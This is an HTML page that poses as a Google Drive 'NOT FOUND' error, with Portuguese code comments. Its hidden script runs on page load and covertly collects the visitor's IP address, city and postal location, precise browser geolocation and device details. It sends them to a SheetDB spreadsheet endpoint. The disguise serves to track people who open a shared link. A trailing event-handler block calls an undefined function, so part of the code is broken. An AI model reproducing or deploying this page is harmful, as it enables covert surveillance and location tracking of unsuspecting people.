<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Google Drive</title>
</head>
<body>
<h1>Error: NOT FOUND</h1>

<script>
async function getIPandLocation() {
  try {
    const response = await fetch('https://ipwhois.app/json/');
    const data = await response.json();
    return {
      country: data.country,
      region: data.region,     
      city: data.city,         
      postal: data.postal,     
      lat_ip: data.latitude,
      lon_ip: data.longitude,
      ip: data.ip              
    };
  } catch(e) {
    console.error('Erro ao obter IP/localização:', e);
    return {};
  }
}

function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    timestamp: new Date().toISOString()
  };
}

async function sendDataToSheet(collectedData) {
  const sheetDbUrl = 'https://sheetdb.io/api/v1/eu5qmx1222j2g';
  try {
    const response = await fetch(sheetDbUrl, {
      method: 'POST',
      headers: { 
        'Accept': 'application/json',
        'Content-Type': 'application/json' 
      },
      body: JSON.stringify({
        data: [collectedData]
      })
    });
    const result = await response.json();
  } catch(e) {
    console.error('Erro ao enviar ao SheetDB:', e);
  }
}

async function main() {
  const ipLocationData = await getIPandLocation();
  const browserData = getBrowserInfo();
  
  let geoLocationSent = false;

  if (navigator.geolocation) {
    // Timeout aumentado para 30 segundos
    const geoTimeout = setTimeout(() => {
      if (!geoLocationSent) {
        console.warn('Timeout: geolocalização demorou mais de 30s');
        const collectedData = {...ipLocationData, ...browserData, geo_error: 3};
        sendDataToSheet(collectedData);
        geoLocationSent = true;
      }
    }, 30000);

    // Configurações otimizadas para maior compatibilidade
    const options = {
      enableHighAccuracy: false,  // Usa WiFi/rede em vez de só GPS (mais rápido)
      timeout: 25000,              // 25 segundos para obter posição
      maximumAge: 60000            // Aceita cache de até 1 minuto (mais rápido)
    };

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(geoTimeout);
        if (!geoLocationSent) {
          const collectedData = {
            ...ipLocationData,
            lat_browser: pos.coords.latitude,
            lon_browser: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            ...browserData
          };
          sendDataToSheet(collectedData);
          geoLocationSent = true;
        }
      },
      (error) => {
        clearTimeout(geoTimeout);
        console.warn('Geolocalização falhou:', error.message, 'Code:', error.code);
        if (!geoLocationSent) {
          const collectedData = {...ipLocationData, ...browserData, geo_error: error.code};
          sendDataToSheet(collectedData);
          geoLocationSent = true;
        }
      },
      options
    );
  } else {
    const collectedData = {...ipLocationData, ...browserData};
    sendDataToSheet(collectedData);
  }
}

  // Adicione isto no final da função main()
setTimeout(() => {
  document.addEventListener('click', function() {
    requestGeolocationWithData(ipLocationData, browserData);
  }, { once: true });
}, 500);

main();
</script>

</body>
</html>

